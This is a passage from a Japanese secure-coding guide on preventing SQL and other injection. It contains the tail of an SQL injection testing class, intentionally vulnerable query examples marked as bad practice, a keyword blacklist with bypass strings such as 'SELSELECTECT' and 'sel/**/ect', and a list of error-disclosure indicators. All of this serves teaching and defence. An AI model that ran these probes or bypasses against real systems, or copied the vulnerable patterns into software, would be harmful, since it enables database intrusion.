            # 異常な応答の検出
            if response.status_code == 500:
                suspicious = True  # SQLエラー
            if "sql" in response.text.lower() or "syntax" in response.text.lower():
                suspicious = True  # エラーメッセージ漏洩
            if len(response.text) != len(baseline.text):
                suspicious = True  # レスポンスサイズの変化

            results.append({
                "payload": payload,
                "status": response.status_code,
                "suspicious": suspicious,
                "response_length": len(response.text),
            })

        return results

    def test_error_disclosure(self, url: str, param: str) -> Dict:
        """エラーメッセージにDB情報が含まれていないか確認"""
        error_indicators = [
            "mysql", "postgresql", "sqlite", "oracle",
            "syntax error", "unclosed quotation",
            "unterminated string", "SQL",
        ]
        response = requests.get(url, params={param: "'"})
        found = [ind for ind in error_indicators
                 if ind.lower() in response.text.lower()]
        return {
            "error_disclosure": len(found) > 0,
            "indicators_found": found,
        }

# 使用例（必ず許可された環境でのみ実行すること）
# tester = InjectionTester()
# results = tester.test_sql_injection("http://localhost:8080/search", "q")
```

---

## 11. パフォーマンスに関する考察

```
パラメータ化クエリのパフォーマンス効果:

  文字列連結 vs パラメータ化クエリ:

  +----------------------------+------------------+------------------+
  | 項目                       | 文字列連結       | パラメータ化     |
  +----------------------------+------------------+------------------+
  | クエリプラン               | 毎回生成          | キャッシュ可能   |
  | パース処理                 | 毎回実行          | 初回のみ         |
  | セキュリティ               | 脆弱              | 安全             |
  | 10,000回実行時の速度比較   | 1.0x (基準)       | 0.7x-0.9x (速い)|
  +----------------------------+------------------+------------------+

  ORM のオーバーヘッド:
  - クエリ生成: +0.1-0.5ms (ほとんどの場合無視できる)
  - N+1 問題: eager loading で対処
  - 複雑なクエリ: 生SQL + パラメータバインディング

  パフォーマンスとセキュリティはトレードオフではない。
  パラメータ化クエリは安全性とパフォーマンスの両方を向上させる。
```

---

## 演習

### 演習1: 基礎 — パラメータ化クエリへの書き換え

**課題**: 以下の脆弱なコードをパラメータ化クエリに書き換えよ。

```python
# 書き換え対象:
def search_products(category, min_price, max_price, sort_by):
    query = f"""
    SELECT * FROM products
    WHERE category = '{category}'
    AND price BETWEEN {min_price} AND {max_price}
    ORDER BY {sort_by}
    """
    return db.execute(query).fetchall()

# ヒント:
# - category, min_price, max_price はパラメータ化
# - sort_by はホワイトリストで検証（パラメータ化できない部分）
```

### 演習2: 応用 — 包括的な入力バリデーション

**課題**: 以下の要件を満たすバリデーションクラスを実装せよ。

```
要件:
1. 文字列型のバリデーション（長さ、パターン、禁止文字）
2. 数値型のバリデーション（範囲、整数/浮動小数）
3. メールアドレスのバリデーション
4. SQLインジェクション / NoSQLインジェクションの検出
5. バリデーションエラーの詳細レポート
6. カスタムルールの追加が可能な拡張性
```

### 演習3: 発展 — セキュアなCRUD API

**課題**: FastAPI + SQLAlchemy で以下を満たすAPIを実装せよ。

```
要件:
1. ユーザーの CRUD 操作 (Create, Read, Update, Delete)
2. すべてのSQL操作がパラメータ化されていること
3. 入力バリデーション (Pydantic モデル)
4. エラーメッセージにDB情報を含めないこと
5. 検索機能で LIKE 句のワイルドカードをエスケープ
6. ページネーション（limit/offset の上限設定）
7. SQL ログの適切な管理（本番ではクエリ内容を出力しない）

検証:
- sqlmap でテストして脆弱性がないことを確認
```

---

## アンチパターン

### アンチパターン1: ブラックリストによるフィルタリング

`SELECT`、`DROP` 等の危険なキーワードをフィルタするアプローチ。バイパス手法は無数にあり（大文字小文字の混在、エンコーディング、コメント挿入等）、根本的な対策にはならない。パラメータ化クエリが唯一の正解である。

```python
# NG: ブラックリスト方式
BLACKLIST = ["SELECT", "DROP", "DELETE", "UNION", "INSERT", "--", ";"]

def sanitize_input_bad(value):
    for keyword in BLACKLIST:
        value = value.replace(keyword, "")
    return value
# バイパス: "SELSELECTECT" → "SELECT" (除去後に元に戻る)
# バイパス: "sel/**/ect" → ブラックリストにマッチしない

# OK: パラメータ化クエリ
def query_safe(value):
    return db.execute("SELECT * FROM users WHERE name = ?", (value,))
```

### アンチパターン2: クライアントサイドのみのバリデーション

フロントエンドのJavaScriptでのみ入力検証を行うパターン。攻撃者はブラウザを経由せずAPIに直接リクエストを送信できるため、必ずサーバーサイドでバリデーションを実施する。

```python
# NG: クライアントサイドのみ
# JavaScript: if (input.includes("'")) { alert("不正な文字"); }
# → curl で直接 API にリクエスト送信されたら無意味

# OK: サーバーサイドで必ずバリデーション
from pydantic import BaseModel, validator

class SearchInput(BaseModel):
    keyword: str

    @validator("keyword")
    def validate_keyword(cls, v):
        if len(v) > 100:
            raise ValueError("Keyword too long")
        if not v.isalnum() and not v.replace(" ", "").isalnum():
            raise ValueError("Invalid characters")
        return v
```

### アンチパターン3: エラーメッセージの過剰な露出

```python
# NG: SQLエラーをそのままユーザーに返す
@app.route("/search")
def search():
    try:
        result = db.execute(f"SELECT * FROM users WHERE id={request.args['id']}")
    except Exception as e:
        return f"Error: {str(e)}", 500
    # → "Error: near "OR": syntax error" のようなメッセージが
    #   攻撃者にDBの種類やクエリ構造のヒントを与える

# OK: 汎用的なエラーメッセージ + 内部ログ
@app.route("/search")
def search():
    try:
        result = db.execute("SELECT * FROM users WHERE id=?",
                           (request.args['id'],))
    except Exception as e:
        logger.error(f"Database error: {e}")  # 詳細は内部ログのみ
        return {"error": "リクエストの処理に失敗しました"}, 500
```

---

## FAQ

### Q1: ORMを使っていればSQLインジェクションは完全に防げますか?

ほぼ防げるが、完全ではない。ORMでも`raw()`や`execute()`で直接SQLを書く場合や、文字列連結でクエリを構築する場合にはSQLインジェクションが発生する。また、ORMの特定バージョンに脆弱性が存在する場合もある。ORM使用時でも、生SQLを書く場合は必ずパラメータバインディングを使用すること。

### Q2: WAFだけでインジェクションを防げますか?

WAFだけでは不十分。WAFはシグネチャベースの検出であり、高度なバイパス手法には対応できない場合がある。WAFは補助的な防御層として位置づけ、パラメータ化クエリ等の根本対策と併用すべきである。WAFの誤検知（False Positive）により正常なリクエストがブロックされるリスクもある。

### Q3: プリペアドステートメントとパラメータ化クエリは同じものですか?

概念的にはほぼ同じだが、厳密には異なる。プリペアドステートメントはDB側でクエリプランをキャッシュする仕組みを含み、パラメータ化クエリはデータとコードを分離する手法を指す。両方とも、インジェクション防御として有効である。ライブラリによってはクライアント側でエスケープする「エミュレートされたプリペアドステートメント」もあるが、真のプリペアドステートメント（サーバーサイド）の方が安全性が高い。

### Q4: NoSQL データベースにもインジェクションはありますか?

ある。MongoDBの演算子インジェクション（`$ne`, `$gt` 等）や、`$where`句を使ったJavaScriptインジェクションなどが代表的。NoSQLはスキーマレスであるため、型チェックが特に重要になる。入力が文字列であることを厳密に検証し、オブジェクト型（演算子を含む可能性がある）を拒否することが基本対策となる。

### Q5: テンプレートインジェクション（SSTI）はどう防ぎますか?

最も重要な対策は、ユーザー入力をテンプレート文字列の一部として結合しないこと。テンプレートは固定し、変数として渡す。やむを得ず動的テンプレートが必要な場合は、SandboxedEnvironmentを使用し、危険な属性やメソッドへのアクセスを制限する。

### Q6: ORDER BY 句や LIMIT 句はパラメータ化できますか?

ほとんどのDBドライバでは、ORDER BY のカラム名やソート方向（ASC/DESC）をパラメータ化できない。これらはSQLの構造の一部であり、データではないため。対策としては、許可するカラム名をホワイトリストで検証し、安全な値であることを確認してから文字列連結する。LIMIT/OFFSET は数値型として検証した上でパラメータ化可能な場合が多い。

---

## トラブルシューティング

### パラメータ化クエリで IN 句を使いたい

```python
# NG: IN句を文字列連結で構築
ids = [1, 2, 3]
query = f"SELECT * FROM users WHERE id IN ({','.join(map(str, ids))})"

# OK: プレースホルダを動的生成
ids = [1, 2, 3]
placeholders = ','.join(['?'] * len(ids))
query = f"SELECT * FROM users WHERE id IN ({placeholders})"
result = db.execute(query, ids)

# OK: SQLAlchemy
from sqlalchemy import select
stmt = select(User).where(User.id.in_([1, 2, 3]))
```

### 動的にカラム名を指定したい

```python
# NG: カラム名を直接埋め込み
column = request.args["sort_by"]
query = f"SELECT * FROM users ORDER BY {column}"

# OK: ホワイトリストで検証
ALLOWED_SORT_COLUMNS = {"username", "email", "created_at"}

column = request.args["sort_by"]
if column not in ALLOWED_SORT_COLUMNS:
    column = "created_at"  # デフォルト値
query = f"SELECT * FROM users ORDER BY {column}"
```

---

## まとめ

| 防御手法 | 対象 | 効果 | 推奨度 |
|---------|------|------|--------|
| パラメータ化クエリ | SQL/NoSQL | データとコードの完全分離 | 必須 |
| ORM | SQL | 安全なクエリ構築の抽象化 | 推奨 |
| 入力バリデーション | 全般 | 不正入力の早期排除 | 必須 |
| shell=Falseリスト実行 | コマンド | シェル解釈の回避 | 必須 |
| エスケープ | LDAP/XPath | 特殊文字の無害化 | 必須 |
| テンプレート変数分離 | SSTI | コードとデータの分離 | 必須 |
| WAF | 全般 | 既知パターンのブロック | 補助 |
| DB最小権限 | SQL | 被害の最小化 | 推奨 |
| エラーメッセージ制御 | 全般 | 情報漏洩の防止 | 必須 |

---

## 次に読むべきガイド

- [04-auth-vulnerabilities.md](./04-auth-vulnerabilities.md) -- 認証脆弱性とセッション管理
- [01-xss-prevention.md](./01-xss-prevention.md) -- XSS（HTMLインジェクション）の詳細
- [../04-application-security/00-secure-coding.md](../04-application-security/00-secure-coding.md) -- セキュアコーディング全般
- [../02-cryptography/01-tls-certificates.md](../02-cryptography/01-tls-certificates.md) -- 暗号化による通信保護

---

## 参考文献

1. OWASP Injection Prevention Cheat Sheet -- https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
2. OWASP SQL Injection Prevention Cheat Sheet -- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
3. PortSwigger Web Security Academy: SQL Injection -- https://portswigger.net/web-security/sql-injection
4. CWE-89: Improper Neutralization of Special Elements used in an SQL Command -- https://cwe.mitre.org/data/definitions/89.html
5. CWE-78: OS Command Injection -- https://cwe.mitre.org/data/definitions/78.html
6. CWE-90: LDAP Injection -- https://cwe.mitre.org/data/definitions/90.html
7. CWE-1336: Server-Side Template Injection -- https://cwe.mitre.org/data/definitions/1336.html
8. MongoDB Security Checklist -- https://www.mongodb.com/docs/manual/administration/security-checklist/
9. OWASP Testing Guide: SQL Injection -- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
